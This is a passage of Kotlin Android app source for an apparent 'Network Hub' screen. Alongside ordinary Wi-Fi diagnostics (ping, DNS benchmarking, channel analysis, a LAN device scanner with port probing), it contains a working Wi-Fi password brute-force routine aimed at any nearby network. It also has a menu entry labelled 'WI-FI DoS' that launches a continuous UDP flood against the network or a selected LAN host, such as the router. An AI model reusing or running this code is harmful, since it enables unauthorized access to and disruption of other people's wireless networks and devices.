                if (isGw) {
                    subParts += "DNS · DHCP · LAN"
                }
                if (!dev.brand.isNullOrBlank() && !bestTitle.contains(dev.brand, ignoreCase = true)) {
                    subParts += dev.brand
                }
                if (!dev.mac.isNullOrBlank()) {
                    subParts += "MAC ${dev.mac}"
                }
                if (dev.openPorts.isNotEmpty() && !isGw) {
                    val portLabels = dev.openPorts.take(3).joinToString(", ") { p ->
                        portServiceNames[p] ?: p.toString()
                    }
                    subParts += portLabels
                }
                if (subParts.isEmpty()) {
                    subParts += if (isVi) "đang kết nối" else "online"
                }
                return HubLanHost(
                    ip = dev.ip,
                    title = bestTitle,
                    subtitle = subParts.joinToString(" · "),
                    isGateway = isGw,
                    isSelf = false
                )
            }

            // 3. Controlled Batched Scan (32 IPs at a time so sockets/threads never starve!)
            coroutineScope {
                for (batch in (1..254).chunked(32)) {
                    if (!isActive) break
                    val batchResults = batch.map { i ->
                        async(Dispatchers.IO) {
                            val ip = "$subnet.$i"
                            if (ip == self) return@async null
                            val isGw = ip == effectiveGateway || i == 1
                            val inArp = neighborMap.containsKey(ip)
                            val reachable = runCatching {
                                inArp || isGw || InetAddress.getByName(ip).isReachable(340)
                            }.getOrDefault(false)
                            val openPorts = checkLanCommonPorts(ip, if (reachable) 95 else 48)
                            if (!reachable && openPorts.isEmpty()) return@async null

                            val dev = resolveFullLanIdentity(
                                context = context,
                                ip = ip,
                                gatewayIp = effectiveGateway,
                                dnsServers = dhcpDns,
                                initialMac = neighborMap[ip],
                                openPorts = openPorts,
                                nsdName = nsdMap[ip],
                                ssdpPair = upnpMap[ip],
                                isVi = isVi
                            )
                            buildHostItem(dev, isGw)
                        }
                    }.awaitAll().filterNotNull()

                    if (batchResults.isNotEmpty()) {
                        batchResults.forEach { hosts[it.ip] = it }
                        withContext(Dispatchers.Main) {
                            lanHosts.clear()
                            lanHosts.addAll(
                                hosts.values
                                    .filter { !it.isSelf }
                                    .sortedWith(
                                        compareByDescending<HubLanHost> { it.isGateway }
                                            .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 }
                                    )
                            )
                        }
                    }
                }
            }

            // 4. Final harvest of ARP/Neighbor table & late mDNS/UPnP responses
            ssdpJob.cancel()
            if (ndm != null) {
                for (l in nsdListeners) {
                    runCatching { ndm.stopServiceDiscovery(l) }
                }
            }
            val finalArp = readSystemNeighborTable()
            for ((ip, mac) in finalArp) {
                if (!ip.startsWith("$subnet.") || ip == self) continue
                val existing = hosts[ip]
                if (existing == null) {
                    val dev = resolveFullLanIdentity(
                        context = context,
                        ip = ip,
                        gatewayIp = effectiveGateway,
                        dnsServers = dhcpDns,
                        initialMac = mac,
                        openPorts = emptyList(),
                        nsdName = nsdMap[ip],
                        ssdpPair = upnpMap[ip],
                        isVi = isVi
                    )
                    hosts[ip] = buildHostItem(dev, ip == effectiveGateway)
                } else {
                    val lateName = nsdMap[ip]
                    if (!lateName.isNullOrBlank() && (existing.title.contains("Máy ") || existing.title.contains("Device "))) {
                        hosts[ip] = existing.copy(title = lateName)
                    }
                }
            }

            withContext(Dispatchers.Main) {
                lanHosts.clear()
                lanHosts.addAll(
                    hosts.values
                        .filter { !it.isSelf }
                        .sortedWith(
                            compareByDescending<HubLanHost> { it.isGateway }
                                .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 }
                        )
                )
                lanScanning = false
                appendLog(if (isVi) "Đã tìm thấy thiết bị: ${lanHosts.size}" else "Devices found: ${lanHosts.size}")
            }
        }
    }

    fun startWifiBruteForce(network: HubWifiNetwork) {
        bruteForceJob?.cancel()
        sendLogs.clear()
        dialogStage = HubDialogStage.BruteForce
        val selectedGroups = passwordGroups.filter { it.selected }
        val ordered = selectedGroups
            .flatMap { it.allPasswords() }
            .filter { it.length >= 8 }
            .distinct()
        val totalSelected = selectedGroups.sumOf { it.allPasswords().size }
        val targetSsid = network.ssid.trim('"')
        appendLog("Starting Brute Force: $targetSsid")
        appendLog("Groups: ${selectedGroups.joinToString { it.name }}")
        appendLog("Passwords to try: ${ordered.size} (${totalSelected - ordered.size} skipped, < 8 chars)")

        bruteForceJob = scope.launch(Dispatchers.IO) {

            withContext(Dispatchers.Main) {
                appendLog("Preparing radio (leave target / clear old suggestions)...")
            }
            prepareRadioForBrute(wifiManager, targetSsid)

            if (isFullyConnectedToSsid(wifiManager, targetSsid)) {
                withContext(Dispatchers.Main) {
                    appendLog("Still on $targetSsid. Disconnect from this network in system Wi-Fi and retry.")
                    appendLog("Scan finished.")
                }
                return@launch
            }

            for (index in ordered.indices) {
                if (!isActive) break
                val password = ordered[index]

                withContext(Dispatchers.Main) {
                    currentBrutePassword = password
                    appendLog("[${index + 1}/${ordered.size}] Testing: $password")
                }


                val result = testWifiPassword(context, wifiManager, targetSsid, password)

                if (!isActive) break

                if (result) {

                    val found = password
                    withContext(Dispatchers.Main) {
                        currentBrutePassword = found
                        appendLog("SUCCESS! Password found: $found")
                        foundPassword = found
                        bruteForceSuccess = true
                        com.droid.dolphy.trackWifiBruteSuccess(context)
                        haptics.performHapticFeedback(
                            androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
                        )
                    }

                    break
                } else {
                    withContext(Dispatchers.Main) {
                        appendLog("Failed: $password")
                    }

                    settleAfterFailedAttempt(wifiManager, targetSsid)
                }
            }
            if (isActive) {
                withContext(Dispatchers.Main) {
                    appendLog("Scan finished.")
                }
            }
        }
    }

    fun closeDialog() {
        udpSendJob?.cancel()
        bruteForceJob?.cancel()
        lanScanJob?.cancel()
        udpSendJob = null
        bruteForceJob = null
        lanScanJob = null
        dialogStage = null
        dialogNetwork = null
        countdown = 3
        launchedWifiSettings = false
        sendLogs.clear()
        bruteForceSuccess = false
        foundPassword = ""
        selectedTargetLabel = ""
        lanHosts.clear()
        lanScanning = false
    }

    fun startActiveNetworkTest(network: HubWifiNetwork, targetIp: String? = null, label: String = "") {
        udpSendJob?.cancel()
        udpSendJob = null
        lanScanJob?.cancel()
        dialogNetwork = network
        selectedTargetLabel = label
        dialogStage = HubDialogStage.Started
        launchedWifiSettings = false
        sendLogs.clear()
        udpSendJob = startContinuousUdpTest(network.ssid, targetIp)
    }

    LaunchedEffect(wifiPermissionsGranted, locationServicesEnabled) {
        if (wifiPermissionsGranted && !locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    DisposableEffect(lifecycleOwner, wifiPermissionsGranted) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                wifiPermissionsGranted = hasWifiPermissions()
                locationServicesEnabled = isLocationServicesEnabled()
                showLocationServicesDialog = wifiPermissionsGranted && !locationServicesEnabled
                refreshNetworks()

                val target = dialogNetwork
                if (launchedWifiSettings && dialogStage == HubDialogStage.WaitingConnection && target != null) {
                    val connected = currentSsid() == target.ssid
                    launchedWifiSettings = false
                    if (connected) {
                        dialogStage = HubDialogStage.Started
                        sendLogs.clear()
                        udpSendJob?.cancel()
                        udpSendJob = null
                        udpSendJob = startContinuousUdpTest(target.ssid)
                    } else {
                        dialogStage = HubDialogStage.Error
                    }
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    DisposableEffect(wifiPermissionsGranted, locationServicesEnabled, wifiManager) {
        refreshNetworks()
        val job = scope.launch {
            while (isActive) {
                if (wifiPermissionsGranted && locationServicesEnabled) refreshNetworks()
                delay(2500)
            }
        }
        onDispose { job.cancel() }
    }

    LaunchedEffect(dialogStage, countdown, dialogNetwork?.ssid) {
        if (dialogStage == HubDialogStage.Countdown && dialogNetwork != null) {
            if (countdown > 1) {
                delay(1000)
                countdown -= 1
            } else {
                delay(1000)
                dialogStage = HubDialogStage.WaitingConnection
                launchedWifiSettings = true
                context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
            }
        }
    }

    Box(modifier = Modifier.fillMaxSize()) {
        MaterialBackground(accentColor = MaterialTheme.colorScheme.primary) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .statusBarsPadding()
                    .navigationBarsPadding()
                    .padding(horizontal = 16.dp, vertical = 12.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                SectionTopBar(
                    title = stringResource(R.string.network_hub_title),
                    onBack = { navController.popBackStack() },
                    actions = {
                        DolphyIconButton(onClick = { showPasswordDialog = true }) {
                            Icon(Icons.Filled.VpnKey, contentDescription = stringResource(R.string.wifi_brute_force_passwords), tint = MaterialTheme.colorScheme.primary)
                        }
                    }
                )

                if (!wifiPermissionsGranted) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_need_location),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            com.droid.dolphy.AccentButton(onClick = {
                                wifiPermissionLauncher.launch(requiredWifiPermissions())
                            }) {
                                Text(stringResource(R.string.us_wifi_grant_location))
                            }
                        }
                    }
                } else if (!locationServicesEnabled) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.us_wifi_need_location_services),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            com.droid.dolphy.AccentButton(onClick = {
                                showLocationServicesDialog = false
                                context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                            }) {
                                Text(stringResource(R.string.us_wifi_enable_location_services))
                            }
                        }
                    }
                }

                var quickPingResult by remember { mutableStateOf<String?>(null) }
                var quickPingRunning by remember { mutableStateOf(false) }
                var lowLatencyBoostActive by remember { mutableStateOf(false) }
                val lowLatencyWifiLock = remember {
                    runCatching {
                        val lockMode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            WifiManager.WIFI_MODE_FULL_LOW_LATENCY
                        } else {
                            @Suppress("DEPRECATION")
                            WifiManager.WIFI_MODE_FULL_HIGH_PERF
                        }
                        wifiManager.createWifiLock(lockMode, "Dolphy:LowLatencyBoost").apply {
                            setReferenceCounted(false)
                        }
                    }.getOrNull()
                }
                DisposableEffect(Unit) {
                    onDispose {
                        runCatching {
                            if (lowLatencyWifiLock?.isHeld == true) lowLatencyWifiLock.release()
                        }
                    }
                }

                LazyColumn(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(horizontal = 16.dp),
                    verticalArrangement = Arrangement.spacedBy(M3SegmentedListItemSpacing),
                    contentPadding = PaddingValues(bottom = 20.dp, top = 8.dp),
                ) {
                    item(key = "live_wifi_telemetry") {
                        val isVi = AppLocale.isVietnamese(context)
                        val connInfo = runCatching { wifiManager.connectionInfo }.getOrNull()
                        val activeSsidName = currentSsid() ?: (if (isVi) "Chưa kết nối Wi-Fi" else "Not connected")
                        val localIpStr = getHubLocalIpv4() ?: "—"
                        val gwIpStr = getGatewayIpAddress(context) ?: "—"
                        val dnsStr = getDhcpDnsServers(context).joinToString(", ").ifBlank { "—" }
                        val linkMbps = connInfo?.linkSpeed?.takeIf { it > 0 }?.let { "$it Mbps" } ?: "—"
                        val rssiDbm = connInfo?.rssi?.takeIf { it > -127 && it < 0 }?.let { "$it dBm" } ?: "—"

                        MaterialCard(
                            modifier = Modifier.fillMaxWidth().padding(bottom = 6.dp),
                            accentColor = MaterialTheme.colorScheme.primary,
                            cornerRadius = 18.dp,
                            contentPadding = 16.dp
                        ) {
                            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = activeSsidName,
                                        style = MaterialTheme.typography.titleMedium,
                                        fontWeight = FontWeight.Bold,
                                        color = MaterialTheme.colorScheme.primary
                                    )
                                    Text(
                                        text = "$rssiDbm • $linkMbps",
                                        style = MaterialTheme.typography.labelMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant
                                    )
                                }
                                Text(
                                    text = "IP: $localIpStr  •  Gateway: $gwIpStr\nDNS: $dnsStr",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                                if (quickPingResult != null) {
                                    Surface(
                                        color = MaterialTheme.colorScheme.primary.copy(alpha = 0.12f),
                                        shape = RoundedCornerShape(10.dp),
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Text(
                                            text = quickPingResult!!,
                                            modifier = Modifier.padding(10.dp),
                                            style = MaterialTheme.typography.labelMedium,
                                            color = MaterialTheme.colorScheme.primary,
                                            fontWeight = FontWeight.SemiBold
                                        )
                                    }
                                }
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    FilledTonalButton(
                                        enabled = !quickPingRunning,
                                        onClick = {
                                            quickPingRunning = true
                                            quickPingResult = if (isVi) "Đang đo độ trễ Gateway & DNS..." else "Measuring Gateway & DNS latency..."
                                            scope.launch(Dispatchers.IO) {
                                                fun measureTcpOrIcmp(host: String, port: Int): String {
                                                    val t0 = System.nanoTime()
                                                    val ok = runCatching {
                                                        Socket().use { s ->
                                                            s.connect(InetSocketAddress(host, port), 1200)
                                                            true
                                                        }
                                                    }.getOrElse {
                                                        runCatching { InetAddress.getByName(host).isReachable(1200) }.getOrDefault(false)
                                                    }
                                                    val ms = (System.nanoTime() - t0) / 1_000_000L
                                                    return if (ok) "${ms}ms" else "Timeout"
                                                }
                                                val gwMs = if (gwIpStr != "—") measureTcpOrIcmp(gwIpStr, 80) else "N/A"
                                                val cfMs = measureTcpOrIcmp("1.1.1.1", 53)
                                                val ggMs = measureTcpOrIcmp("8.8.8.8", 53)
                                                withContext(Dispatchers.Main) {
                                                    quickPingRunning = false
                                                    quickPingResult = "Router: $gwMs  •  1.1.1.1: $cfMs  •  8.8.8.8: $ggMs"
                                                }
                                            }
                                        },
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text(if (isVi) "Đo Ping Nhanh" else "Quick Ping", maxLines = 1)
                                    }
                                    FilledTonalButton(
                                        onClick = { navController.navigate("other/lan_scanner_run") },
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text(if (isVi) "Quét Thiết Bị LAN" else "LAN Scanner", maxLines = 1)
                                    }
                                }
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    FilledTonalButton(
                                        onClick = {
                                            val next = !lowLatencyBoostActive
                                            lowLatencyBoostActive = next
                                            runCatching {
                                                if (next) {
                                                    lowLatencyWifiLock?.acquire()
                                                } else if (lowLatencyWifiLock?.isHeld == true) {
                                                    lowLatencyWifiLock.release()
                                                }
                                            }
                                            quickPingResult = if (next) {
                                                if (isVi) "⚡ Đã bật Tăng tốc Wi-Fi Độ trễ thấp (Chống ngủ chip Wi-Fi, giảm giật lag)"
                                                else "⚡ Low-Latency Wi-Fi Boost ON (Wi-Fi power-save disabled)"
                                            } else {
                                                if (isVi) "Đã tắt chế độ Tăng tốc Wi-Fi Độ trễ thấp"
                                                else "Low-Latency Wi-Fi Boost OFF"
                                            }
                                        },
                                        colors = if (lowLatencyBoostActive) {
                                            androidx.compose.material3.ButtonDefaults.filledTonalButtonColors(
                                                containerColor = MaterialTheme.colorScheme.primary,
                                                contentColor = MaterialTheme.colorScheme.onPrimary
                                            )
                                        } else {
                                            androidx.compose.material3.ButtonDefaults.filledTonalButtonColors()
                                        },
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text(
                                            if (lowLatencyBoostActive) {
                                                if (isVi) "⚡ Đang Tăng Tốc" else "⚡ Boost ON"
                                            } else {
                                                if (isVi) "⚡ Tăng Tốc Wi-Fi" else "⚡ Boost Wi-Fi"
                                            },
                                            maxLines = 1
                                        )
                                    }
                                    FilledTonalButton(
                                        enabled = !quickPingRunning,
                                        onClick = {
                                            quickPingRunning = true
                                            quickPingResult = if (isVi) "Đang tìm DNS nhanh nhất & phân tích kênh sóng..." else "Benchmarking DNS & Wi-Fi channels..."
                                            val snapshotNetworks = networks.toList()
                                            scope.launch(Dispatchers.IO) {
                                                val dnsCandidates = buildList {
                                                    if (gwIpStr != "—") add("Router ($gwIpStr)" to gwIpStr)
                                                    add("Cloudflare (1.1.1.1)" to "1.1.1.1")
                                                    add("Cloudflare (1.0.0.1)" to "1.0.0.1")
                                                    add("Google (8.8.8.8)" to "8.8.8.8")
                                                    add("Quad9 (9.9.9.9)" to "9.9.9.9")
                                                }
                                                val dnsScores = dnsCandidates.map { (name, ip) ->
                                                    val query = buildDnsQuery("example.com", 0x1234)
                                                    val t0 = System.nanoTime()
                                                    val ok = runCatching {
                                                        DatagramSocket().use { sock ->
                                                            sock.soTimeout = 900
                                                            val addr = InetAddress.getByName(ip)
                                                            sock.send(DatagramPacket(query, query.size, addr, 53))
                                                            val buf = ByteArray(512)
                                                            sock.receive(DatagramPacket(buf, buf.size))
                                                            true
                                                        }
                                                    }.getOrDefault(false)
                                                    val ms = if (ok) ((System.nanoTime() - t0) / 1_000_000L) else 9999L
                                                    name to ms
                                                }.sortedBy { it.second }

                                                val chCounts = listOf(1, 6, 11).associateWith { ch ->
                                                    snapshotNetworks.count { net ->
                                                        net.frequencyMhz in 2400..2500 &&
                                                            kotlin.math.abs(((net.frequencyMhz - 2407) / 5) - ch) <= 2
                                                    }
                                                }
                                                val bestCh24 = chCounts.minByOrNull { it.value }?.key ?: 6
                                                val bestDns = dnsScores.firstOrNull { it.second < 9999L }

                                                withContext(Dispatchers.Main) {
                                                    quickPingRunning = false
                                                    val dnsLine = dnsScores.filter { it.second < 9999L }
                                                        .take(3)
                                                        .joinToString(" • ") { "${it.first}: ${it.second}ms" }
                                                        .ifBlank { if (isVi) "Không đo được DNS" else "DNS unreachable" }
                                                    quickPingResult = if (isVi) {
                                                        "🏆 DNS nhanh nhất: ${bestDns?.let { "${it.first} (${it.second}ms)" } ?: "—"}\n📊 Top DNS: $dnsLine\n📡 Kênh 2.4GHz ít nhiễu nhất: Kênh $bestCh24 (${chCounts[bestCh24]} mạng quanh đây)"
                                                    } else {
                                                        "🏆 Fastest DNS: ${bestDns?.let { "${it.first} (${it.second}ms)" } ?: "—"}\n📊 Top DNS: $dnsLine\n📡 Cleanest 2.4GHz channel: CH $bestCh24 (${chCounts[bestCh24]} nearby)"
                                                    }
                                                }
                                            }
                                        },
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text(if (isVi) "Tối Ưu DNS/Kênh" else "Optimize DNS", maxLines = 1)
                                    }
                                }
                            }
                        }
                    }

                    m3SegmentedItems(networks.toList()) { index, count, network ->
                        val active = network.isActive
                        val tint = if (active) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F)
                        val bandLabel = when {
                            network.frequencyMhz in 2400..2500 -> "2.4G CH ${(network.frequencyMhz - 2407) / 5}"
                            network.frequencyMhz in 5000..5900 -> "5G CH ${(network.frequencyMhz - 5000) / 5}"
                            else -> "${network.frequencyMhz} MHz"
                        }
                        val secLabel = when {
                            network.capabilities?.contains("WPA3") == true -> "WPA3"
                            network.capabilities?.contains("WPA2") == true -> "WPA2"
                            network.capabilities?.contains("WPA") == true -> "WPA"
                            network.capabilities?.contains("WEP") == true -> "WEP"
                            else -> "Open"
                        }
                        M3SegmentedListItem(
                            index = index,
                            count = count,
                            headline = network.ssid,
                            supporting = if (active) {
                                "${stringResource(R.string.network_hub_active_pinned)} • $bandLabel • $secLabel • ${network.level} dBm"
                            } else {
                                "$bandLabel • $secLabel • ${network.level} dBm"
                            },
                            leadingIcon = Icons.Default.Wifi,
                            leadingIconTint = tint,
                            selected = active,
                            trailingContent = {
                                if (active) {
                                    Icon(
                                        Icons.Filled.CheckCircle,
                                        null,
                                        tint = MaterialTheme.colorScheme.primary,
                                        modifier = Modifier.size(20.dp),
                                    )
                                }
                            },
                            onClick = {
                                haptics.performHapticFeedback(
                                    androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
                                )
                                if (!wifiPermissionsGranted) {
                                    wifiPermissionLauncher.launch(requiredWifiPermissions())
                                } else if (!locationServicesEnabled) {
                                    showLocationServicesDialog = true
                                } else {
                                    dialogNetwork = network
                                    dialogStage = HubDialogStage.Menu
                                }
                            },
                        )
                    }

                    item {
                        Spacer(modifier = Modifier.height(180.dp))
                    }
                }
            }
        }
    }

    if (showLocationServicesDialog) {
        com.droid.dolphy.ExpressiveDialog(
            onDismissRequest = { showLocationServicesDialog = false },
            title = { Text(stringResource(R.string.us_wifi_location_services_disabled_title)) },
            text = { Text(stringResource(R.string.us_wifi_location_services_disabled_message)) },
            confirmButton = {
                com.droid.dolphy.AccentButton(onClick = {
                    showLocationServicesDialog = false
                    context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }) {
                    Text(stringResource(R.string.us_wifi_enable_location_services))
                }
            },
            dismissButton = {
                com.droid.dolphy.AccentButton(onClick = { showLocationServicesDialog = false }) {
                    Text(stringResource(R.string.cancel))
                }
            }
        )
    }

    val currentDialogNetwork = dialogNetwork
    val currentDialogStage = dialogStage
    if (currentDialogNetwork != null && currentDialogStage != null) {
        Dialog(
            onDismissRequest = { closeDialog() },
            properties = DialogProperties(dismissOnClickOutside = false)
        ) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(28.dp),
                color = MaterialTheme.colorScheme.surfaceContainerHighest,
                tonalElevation = 8.dp
            ) {
                when (currentDialogStage) {
                    HubDialogStage.Menu -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = currentDialogNetwork.ssid,
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.onSurface
                            )

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = MaterialTheme.colorScheme.primary,
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "WI-FI DoS",
                                    description = stringResource(R.string.wifi_stress_test),
                                    icon = Icons.Default.FlashOn,
                                    accentColor = MaterialTheme.colorScheme.primary,
                                    onClick = {
                                        if (currentDialogNetwork.isActive) {
                                            startActiveNetworkTest(currentDialogNetwork)
                                        } else {
                                            dialogStage = HubDialogStage.Countdown
                                            countdown = 3
                                            launchedWifiSettings = false
                                            sendLogs.clear()
                                        }
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFFFF6D00),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = if (AppLocale.isVietnamese(context)) "Kiểm thử thiết bị LAN" else "LAN Device Test",
                                    description = if (AppLocale.isVietnamese(context)) "Kiểm thử kết nối tới một thiết bị cụ thể trong mạng LAN" else "Test connection to a specific device on LAN",
                                    icon = Icons.Default.WifiOff,
                                    accentColor = Color(0xFFFF6D00),
                                    onClick = {
                                        dialogStage = HubDialogStage.SelectDevice
                                        startLanDeviceScan()
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFFF44336),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "Pass Brute",
                                    description = stringResource(R.string.wifi_password_brute),
                                    icon = Icons.Default.SettingsEthernet,
                                    accentColor = Color(0xFFF44336),
                                    onClick = {
                                        startWifiBruteForce(currentDialogNetwork)
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFF4CAF50),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = stringResource(R.string.network_hub_admin_panel),
                                    description = stringResource(R.string.network_hub_admin_panel_desc),
                                    icon = Icons.Default.Shield,
                                    accentColor = Color(0xFF4CAF50),
                                    onClick = {
                                        dialogStage = HubDialogStage.AdminPanel
                                    }
                                )
                            }

                            com.droid.dolphy.AccentButton(onClick = { closeDialog() }, modifier = Modifier.fillMaxWidth()) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.SelectDevice -> {
                        Column(
                            modifier = Modifier
                                .padding(20.dp)
                                .fillMaxWidth()
                                .heightIn(min = 280.dp, max = 520.dp),
                            verticalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            Text(
                                text = if (AppLocale.isVietnamese(context)) "Chọn thiết bị trong LAN" else "Select LAN Device",
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = if (AppLocale.isVietnamese(context)) "Chọn thiết bị trong mạng «${currentDialogNetwork.ssid}»" else "Select a device on «${currentDialogNetwork.ssid}»",
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            if (lanScanning) {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(10.dp),
                                ) {
                                    CircularProgressIndicator(modifier = Modifier.size(18.dp), strokeWidth = 2.dp)
                                    Text(
                                        if (AppLocale.isVietnamese(context)) "Đang quét mạng LAN… ${lanHosts.size}" else "Scanning LAN… ${lanHosts.size}",
                                        style = MaterialTheme.typography.labelLarge,
                                        color = MaterialTheme.colorScheme.primary,
                                    )
                                }
                            } else {
                                Text(
                                    if (AppLocale.isVietnamese(context)) "Tìm thấy: ${lanHosts.size}" else "Found: ${lanHosts.size}",
                                    style = MaterialTheme.typography.labelLarge,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                            }
                            Surface(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .weight(1f, fill = true)
                                    .heightIn(min = 160.dp, max = 340.dp),
                                shape = RoundedCornerShape(16.dp),
                                color = MaterialTheme.colorScheme.surfaceContainerHigh,
                            ) {
                                if (lanHosts.isEmpty() && !lanScanning) {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text(
                                            if (AppLocale.isVietnamese(context)) "Không tìm thấy thiết bị.\nHãy kết nối vào mạng Wi-Fi này trước." else "No devices found.\nConnect to this Wi-Fi network first.",
                                            textAlign = TextAlign.Center,
                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                                        )
                                    }
                                } else {
                                    LazyColumn(
                                        modifier = Modifier.fillMaxSize(),
                                        contentPadding = PaddingValues(8.dp),
                                        verticalArrangement = Arrangement.spacedBy(6.dp),
                                    ) {
                                        items(lanHosts.size) { index ->
                                            val host = lanHosts[index]
                                            Surface(
                                                onClick = {
                                                    startActiveNetworkTest(
                                                        currentDialogNetwork,
                                                        host.ip,
                                                        label = "${host.title} (${host.ip})",
                                                    )
                                                },
                                                shape = RoundedCornerShape(12.dp),
                                                color = if (host.isGateway) {
                                                    MaterialTheme.colorScheme.primaryContainer
                                                } else {
                                                    MaterialTheme.colorScheme.surface
                                                },
                                                modifier = Modifier.fillMaxWidth(),
                                            ) {
                                                Row(
                                                    Modifier
                                                        .fillMaxWidth()
                                                        .padding(horizontal = 14.dp, vertical = 12.dp),
                                                    verticalAlignment = Alignment.CenterVertically,
                                                    horizontalArrangement = Arrangement.SpaceBetween,
                                                ) {
                                                    Column(Modifier.weight(1f)) {
                                                        Text(
                                                            host.title,
                                                            style = MaterialTheme.typography.titleSmall,
                                                            fontWeight = FontWeight.SemiBold,
                                                        )
                                                        Text(
                                                            buildString {
                                                                append(host.ip)
                                                                if (host.subtitle.isNotBlank() && host.subtitle != host.ip) {
                                                                    append(" · ")
                                                                    append(host.subtitle)
                                                                }
                                                            },
                                                            style = MaterialTheme.typography.bodySmall,
                                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                                                        )
                                                    }
                                                    Icon(
                                                        Icons.Default.FlashOn,
                                                        contentDescription = null,
                                                        tint = if (host.isGateway) {
                                                            MaterialTheme.colorScheme.primary
                                                        } else {
                                                            Color(0xFFFF6D00)
                                                        },
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            Row(
                                Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(8.dp),
                            ) {
                                com.droid.dolphy.AccentButton(
                                    onClick = { dialogStage = HubDialogStage.Menu; lanScanJob?.cancel() },
                                    modifier = Modifier.weight(1f),
                                ) {
                                    Text(stringResource(R.string.cancel))
                                }
                                com.droid.dolphy.AccentButton(
                                    onClick = { startLanDeviceScan() },
                                    enabled = !lanScanning,
                                    modifier = Modifier.weight(1f),
                                ) {
                                    Text(if (AppLocale.isVietnamese(context)) "Quét lại" else "Refresh")
                                }
                            }
                        }
                    }

                    HubDialogStage.Countdown -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_select_network, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.titleLarge,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = countdown.toString(),
                                style = MaterialTheme.typography.displayLarge,
